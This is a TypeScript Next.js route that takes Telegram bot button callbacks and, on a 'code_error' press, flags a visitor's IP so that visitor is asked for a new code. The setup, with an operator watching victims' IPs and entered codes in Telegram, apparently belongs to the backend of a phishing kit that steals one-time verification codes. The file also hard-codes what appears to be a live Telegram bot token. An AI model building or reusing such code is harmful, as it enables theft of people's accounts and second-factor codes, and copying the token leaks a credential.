import { NextRequest, NextResponse } from 'next/server';
import { setCodeErrorFlag } from '../codeErrorStore';

const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    console.log('Callback received:', body);

    if (!body.callback_query) {
      console.log('No callback_query in body');
      return NextResponse.json({ ok: false, error: 'No callback_query' }, { status: 400 });
    }

    if (body.callback_query.data === 'code_error') {
      // Получаем IP из сообщения
      const messageText = body.callback_query.message.text;
      console.log('Message text:', messageText);
      
      // Изменяем регулярку для более точного поиска IP
      const ipMatch = messageText.match(/🌍 <b>IP:<\/b> ([^\n]+)/);
      const ip = ipMatch ? ipMatch[1].trim() : 'localhost';
      console.log('Extracted IP:', ip);
      
      // Устанавливаем флаг ошибки
      setCodeErrorFlag(ip, true);
      console.log('Set code error flag for IP:', ip);
      
      // Отправляем ответ в Telegram
      const answerUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
      const response = await fetch(answerUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: body.callback_query.id,
          text: 'Запрошен новый код'
        })
      });

      if (!response.ok) {
        console.error('Failed to send answer to Telegram:', await response.text());
        return NextResponse.json({ ok: false, error: 'Failed to send answer to Telegram' }, { status: 500 });
      }
      
      return NextResponse.json({ ok: true });
    }

    console.log('Unknown callback data:', body.callback_query.data);
    return NextResponse.json({ ok: false, error: 'Unknown callback data' }, { status: 400 });
  } catch (e) {
    console.error('Callback error:', e);
    return NextResponse.json({ ok: false, error: e?.toString() }, { status: 500 });
  }
} 